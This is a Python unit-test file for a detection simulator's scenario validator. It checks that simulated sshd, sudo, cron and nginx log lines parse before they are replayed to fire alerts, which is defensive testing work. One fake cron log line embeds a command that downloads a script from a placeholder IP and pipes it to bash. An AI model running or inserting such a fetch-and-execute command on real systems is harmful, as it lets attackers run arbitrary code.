# tests/sim/test_scenario_gen.py
"""Unit tests for the simulator's scenario validation.

validate() is the gate that decides whether an LLM-authored scenario is allowed
to run. If it lets through lines that decode to nothing, the simulator produces
plausible-looking traffic that fires no alerts — worse than no simulation at all.
"""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../sim"))

from scenario_gen import ProposedScenario, decoder_patterns, validate  # noqa: E402

HOST = "agent-demo"
IP = "203.0.113.9"
TS = "Oct 17 08:00:00"


def _proposal(log_type, lines):
    return ProposedScenario(
        name="test", description="", mitre=["T1110"], log_type=log_type, lines=lines
    )


def test_linux_auth_failed_password_is_accepted():
    p = _proposal("linux_auth", [
        f"{TS} {HOST} sshd[123]: Failed password for root from {IP} port 22 ssh2"
    ])
    assert len(validate(p, HOST, IP, TS)) == 1


def test_linux_auth_sudo_line_is_accepted():
    p = _proposal("linux_auth", [
        f"{TS} {HOST} sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash"
    ])
    assert len(validate(p, HOST, IP, TS)) == 1


def test_linux_auth_rejects_unrelated_line():
    p = _proposal("linux_auth", ["totally unrelated text with no sshd content"])
    assert validate(p, HOST, IP, TS) == []


def test_sudo_line_as_syslog_parses_but_yields_no_sudo_detection():
    """A sudo line sent as syslog DOES parse — generic_syslog matches any syslog
    line — but it decodes to syslog_message, so no sudo rule fires. validate()
    only answers "does this parse?"; choosing the right log type for an attack is
    the prompt's job. This test pins that boundary so nobody re-adds a crude
    content check that would also reject valid sudo lines sent as linux_auth.
    """
    p = _proposal("syslog", [
        f"{TS} {HOST} sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash"
    ])
    assert len(validate(p, HOST, IP, TS)) == 1


def test_linux_auth_accepts_every_decoder_variant():
    """linux_auth has several decoders; modelling only failed-login rejected
    sudo/useradd/su scenarios as unparseable."""
    variants = [
        f"{TS} {HOST} sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash",
        f"{TS} {HOST} useradd[900]: new user: name=svc, uid=1002, gid=1002, home=/home/svc, shell=/bin/bash",
        f"{TS} {HOST} su: Successful su for root by deploy",
        f"{TS} {HOST} CRON[77]: (root) CMD (/usr/bin/backup.sh)",
        f"{TS} {HOST} pam_unix(sshd:session): session opened for user deploy by deploy(uid=0)",
    ]
    for line in variants:
        out = validate(_proposal("linux_auth", [line]), HOST, IP, TS)
        assert len(out) == 1, f"rejected a valid linux_auth decoder line: {line}"


def test_syslog_cron_line_is_accepted():
    p = _proposal("syslog", [
        f"{TS} {HOST} CRON[77]: (root) CMD (curl -fsSL http://{IP}/x.sh | bash)"
    ])
    assert len(validate(p, HOST, IP, TS)) == 1


def test_nginx_request_is_accepted():
    p = _proposal("nginx_access_combined", [
        f'{IP} - - [{TS}] "GET /admin.php HTTP/1.1" 404 512 "-" "sqlmap/1.7"'
    ])
    assert len(validate(p, HOST, IP, TS)) == 1


def test_nginx_rejects_non_http_line():
    p = _proposal("nginx_access_combined", [f"{TS} {HOST} something else entirely"])
    assert validate(p, HOST, IP, TS) == []


def test_placeholders_are_substituted_before_validation():
    p = _proposal("linux_auth", [
        "{{ts}} {{host}} sshd[1]: Failed password for admin from {{ip}} port 22 ssh2"
    ])
    out = validate(p, HOST, IP, TS)
    assert len(out) == 1
    assert HOST in out[0] and IP in out[0] and TS in out[0]


def test_mixed_batch_keeps_only_valid_lines():
    p = _proposal("linux_auth", [
        f"{TS} {HOST} sshd[123]: Failed password for root from {IP} port 22 ssh2",
        "garbage that does not parse",
        f"{TS} {HOST} sshd[124]: Failed password for admin from {IP} port 22 ssh2",
    ])
    assert len(validate(p, HOST, IP, TS)) == 2


def test_decoder_patterns_cover_supported_types():
    patterns = decoder_patterns()
    assert "linux_auth" in patterns
    assert "nginx_access_combined" in patterns
